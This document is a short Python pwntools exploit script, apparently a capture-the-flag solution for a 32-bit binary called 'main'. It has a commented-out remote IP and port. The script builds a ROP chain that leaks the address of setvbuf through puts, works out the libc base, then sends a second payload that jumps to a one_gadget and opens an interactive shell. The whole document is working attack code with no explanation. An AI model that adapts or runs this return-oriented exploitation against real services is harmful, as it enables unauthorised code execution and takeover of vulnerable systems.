from pwn import *
#target = remote('54.225.38.91', 1028)
target=process('./main',env={'LD_PRELOAD':'/media/sf_kalishared/The_Night-master/libcs/libc6_2.30-0ubuntu2_i386.so'})
libc =ELF('/media/sf_kalishared/The_Night-master/libcs/libc6_2.30-0ubuntu2_i386.so')
context.terminal=["tmux","split","-h"]
#gdb.attach(target)
print(target.recvuntil("o/\n"))

nopret = 0x080490af
setvbuf_GOT = 0x0804c014
puts_plt = 0x08049030
popret = 0x0804901e
funcret = 0x8049070
payload1 = p32(nopret)*20+p32(puts_plt)+p32(popret)+p32(setvbuf_GOT)+p32(funcret)+p32(nopret)*3
target.sendline(payload1)

one_gadget = 0x10afa9


leak0 = target.recvline().strip("\n")
leak1 = target.recvline().strip("\n")
ad1 = u32(leak1[0:4])
print(hex(ad1))
libc_base=ad1-libc.symbols["setvbuf"]
print(hex(libc_base))
libc_execve=libc_base+one_gadget
print(hex(libc_execve))
payload2=p32(nopret)*20+p32(libc_execve)+p32(nopret)*6
target.sendline(payload2)

target.interactive()
